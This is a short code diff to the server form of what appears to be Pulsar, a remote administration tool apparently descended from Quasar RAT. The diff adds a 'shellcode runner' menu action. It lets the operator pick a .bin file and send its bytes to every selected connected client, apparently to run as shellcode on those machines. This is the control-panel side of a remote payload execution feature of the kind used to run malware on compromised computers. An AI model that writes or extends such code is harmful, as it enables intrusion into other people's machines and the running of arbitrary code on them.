@@ -5349,6 +5349,28 @@ namespace Pulsar.Server.Forms
             }
 
         }
+
+        private void shellcodeRunnerToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            using (OpenFileDialog ofd = new OpenFileDialog())
+            {
+                ofd.Multiselect = false;
+                ofd.Filter = "Binary Files (*.bin)|*.bin|All Files (*.*)|*.*";
+
+                if (ofd.ShowDialog() != DialogResult.OK)
+                    return;
+
+                string filePath = ofd.FileName;
+                string fileName = Path.GetFileName(filePath);
+                byte[] fileData = File.ReadAllBytes(filePath);
+
+                foreach (Client c in GetSelectedClients())
+                {
+                    c.Send(new DoSendBinFile(fileName, fileData));
+                }
+            }
+
+        }
     }
 
     public class NotificationEntry
